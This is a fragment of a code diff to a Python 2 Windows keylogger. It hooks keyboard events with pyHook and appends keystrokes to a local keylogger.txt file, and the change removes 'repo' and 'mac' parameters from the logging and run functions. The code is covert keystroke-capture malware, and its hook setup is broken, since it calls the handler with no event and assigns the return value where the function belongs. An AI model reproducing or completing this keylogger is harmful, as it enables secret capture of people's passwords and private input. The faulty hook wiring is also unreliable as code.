@@ -51,7 +51,7 @@ def get_current_process():
     kernel32.CloseHandle(h_process)
 
 
-def KeyStroke(event,repo,mac):
+def KeyStroke(event):
     global current_window
     fileHandle = open ('C:\\pyworks\\before\\keylogger.txt', 'a' )
 
@@ -91,7 +91,7 @@ def KeyStroke(event,repo,mac):
 
 
 
-def run(repo,mac):
+def run():
     print "\n 0000000"
     ti=0
     while ti<5 :
@@ -100,7 +100,7 @@ def run(repo,mac):
         ti+=1
         kl = pyHook.HookManager()
         print 1
-        kl.KeyDown = KeyStroke(repo,mac)
+        kl.KeyDown = KeyStroke()
         print 2
         kl.HookKeyboard()
         print 3
